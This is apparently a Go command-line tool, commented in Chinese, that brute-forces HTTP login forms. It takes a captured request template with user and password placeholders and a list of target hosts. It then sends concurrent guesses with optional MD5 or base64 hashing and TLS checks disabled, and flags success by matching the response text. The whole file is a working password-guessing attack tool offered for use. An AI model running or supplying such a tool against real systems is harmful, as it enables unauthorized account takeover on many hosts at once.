package main

import (
	"bufio"
	"compress/gzip"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/djimenez/iconv-go"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

func HTTP(method string, url string, headers sync.Map, data string, perr, psuc string, charset string, viewresp, viewerr, success bool) {
	defer wg.Done()

	//fmt.Printf("\n\n%s", data)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Timeout:   time.Second * 2,
		Transport: tr,
	}
	//var tmp []byte = []byte(data)

	req, err := http.NewRequest(method, url+"?"+data, nil)
	if method == "POST" {
		req, err = http.NewRequest(method, url, strings.NewReader(data))
	}

	if err != nil {
		if viewerr {
			fmt.Println("设置请求错误：", err)
		}

		runtime.Goexit() ///////////goroutine怎么结束？？？
	}

	headers.Range(func(k1, v1 interface{}) bool {

		req.Header.Add(fmt.Sprintf("%v", k1), fmt.Sprintf("%v", v1))
		return true

	})
	//for k, v := range headers {
	//	req.Header.Add(k, v)
	//}

	resp, err := client.Do(req)
	//defer resp.Body.Close()
	if err != nil {
		if viewerr {
			fmt.Println("请求错误，", err)
		}

		runtime.Goexit() ///////////goroutine怎么结束？？？
	}

	defer resp.Body.Close()
	var body []byte
	if resp.Header.Get("Content-Encoding") == "gzip" { //注意此处一定要判断，否则byte数组转换成字符串时会乱码，
		reader, err := gzip.NewReader(resp.Body)
		if err != nil {
			if viewerr {
				fmt.Println("错误：", err)
			}

		}
		body, _ = ioutil.ReadAll(reader)
	} else {
		body, _ = ioutil.ReadAll(resp.Body)
	}

	//fmt.Println(string(body))
	body2 := string(body)

	if charset != "" {
		body2, err = iconv.ConvertString(body2, charset, "utf-8")
		if err != nil {
			if viewerr {
				fmt.Println("编码失败", err, url)
				//fmt.Println(url)
			}

			body2 = string(body)
			//fmt.Println(string(body))
			//os.Exit(-1)
		}
	}

	//a := strings.Index(body2, perr)
	//a2 := strings.Index(string(body), "密码错误")
	//a3 := strings.Index(string(body), "此用户将被锁定")

	var reg1 *regexp.Regexp
	if perr == "" {
		reg1 = regexp.MustCompile(psuc)
		if reg1 == nil {
			fmt.Println("regexp err")
			return
		}
	} else {
		reg1 = regexp.MustCompile(perr)
		if reg1 == nil {
			fmt.Println("regexp err")
			return
		}
	}

	a1 := reg1.FindAllStringSubmatch(body2, -1)

	// 根据输入的参数是否存在passerr,若存在就不能匹配到正则表达式中的东西,密码才正确
	var a bool = false
	if perr == "" {
		a = len(a1) != 0
	} else {
		a = len(a1) == 0
	}

	if a {
		fmt.Println("\033[31m密码正确\033[0m", url, "data:", data)
		if viewresp {
			fmt.Println(body2, "\n\n")
		}
	} else {
		if !success {
			fmt.Println("密码错误", url)
			if viewresp {
				fmt.Println("    ", body2)
			}
		}
	}
}

var wg sync.WaitGroup

func main() {

	user := flag.String("user", "", "爆破账号")
	passwd := flag.String("passwd", "123456,admin", "爆破密码,使用逗号隔开")
	passerr := flag.String("perr", "", "密码错误提示，使用正则表达式")
	passsuc := flag.String("psuc", "", "密码正确提示，使用正则表达式")
	src := flag.String("src", "1.txt", "数据包")
	links := flag.String("links", "links.txt", "爆破IP地址文件")
	hash := flag.String("hash", "", "密码md5 或 base64,暂只支持md5/base64")
	charset := flag.String("charset", "", "响应数据编码方式")
	viewresp := flag.Bool("viewresp", true, "是否显示响应数据,默认显示")
	viewerr := flag.Bool("viewerr", false, "是否显示报错信息,默认关闭")
	success := flag.Bool("success", false, "是否只显示成功的数据")
	time_sec := flag.Float64("time-sec", 0, "设置请求间隔，单位秒")

	flag.Parse()

	if args := os.Args; args == nil || len(args) < 2 {
		//flag.ErrorHandling()
		fmt.Println("使用 -h 显示帮助信息")
		flag.PrintDefaults()
		os.Exit(0)
	}

	if *passerr == "" && *passsuc == "" {
		//flag.ErrorHandling()
		fmt.Println("passerr 或 passsuc 参数不能为空")
		os.Exit(0)
	}

	//var second int
	//second = *time_sec

	httpfile, err := os.Open(*src)
	if err != nil {
		fmt.Println("文件打开错误")
		return
	}
	defer httpfile.Close()

	reader := bufio.NewReader(httpfile)

	//var protocol = "http"

	var method string
	var url2 string
	var data string

	//var headers map[string]string
	//headers["Host"] = "127.0.0.1"

	//headers := make(map[string]string)

	var headers sync.Map

	for {
		str, err := reader.ReadString('\n')
		str = strings.TrimSpace(str)
		if err == io.EOF {
			if method == "POST" {
				data = str
			} else {
				data = strings.Split(url2, "?")[1]
			}
			break
		}

		getrequest := strings.Index(str, "HTTP/")
		if getrequest != -1 {
			method = strings.Split(str, " ")[0]
			url2 = strings.Split(str, " ")[1]

			//fmt.Println(url2)
		} else {
			if str == "" {
				continue
			} else {
				k := strings.Split(str, ": ")[0]
				v := strings.Split(str, ": ")[1]
				headers.Store(k, v)

			}

		}
	}

	//url := protocol + "://" + headers["Host"] + url2
	fmt.Println("http 请求方法：", method)
	fmt.Println("错误提示：", *passerr)
	//data2 := strings.ReplaceAll(data, "^PASS^", password)
	//data2 = strings.ReplaceAll(data2, "^USER^", *user)
	fmt.Println("请求数据：", strings.ReplaceAll(data, "^PASS^", *passwd))
	fmt.Println("http 请求头:")
	headers.Range(func(k, v interface{}) bool {

		fmt.Println(k, v)
		return true

	})

	file, err := os.Open(*links)
	if err != nil {
		fmt.Println("打开文件失败：", err)
		return
	}
	defer file.Close()

	reader2 := bufio.NewReader(file)

	for {

		str, err := reader2.ReadString('\n') //读取到一个换行符就结束
		str = strings.TrimSpace(str)
		if err == io.EOF { //io.EOF 表示文件的结尾
			break

		}

		var url string
		if method == "GET" {
			url = str + strings.Split(url2, "?")[0]
		} else {
			url = str + url2
		}

		password := strings.Split(*passwd, ",")
		headers.Store("Host", regexp.MustCompile(`http://|https://`).ReplaceAllString(str, "")) //替换请求头的host
		for _, pass := range password {
			pass = strings.TrimSpace(pass)
			if *hash == "md5" {
				pass = MD5(pass)
			}
			if *hash == "base64" {
				pass = base64.URLEncoding.EncodeToString([]byte(pass))
			}
			//fmt.Println(pass)
			data1 := strings.ReplaceAll(data, "^PASS^", pass)
			data2 := strings.ReplaceAll(data1, "^USER^", *user)
			//fmt.Println(url)
			//fmt.Println(headers["Host"])
			//fmt.Println(method)

			time.Sleep(time.Duration(*time_sec) * time.Second)
			wg.Add(1)
			go HTTP(method, url, headers, data2, *passerr, *passsuc, *charset, *viewresp, *viewerr, *success)
		}

	}

	wg.Wait()

}

func MD5(str string) string {
	data := []byte(str) //切片
	has := md5.Sum(data)
	md5str := fmt.Sprintf("%x", has) //将[]byte转成16进制
	return md5str
}
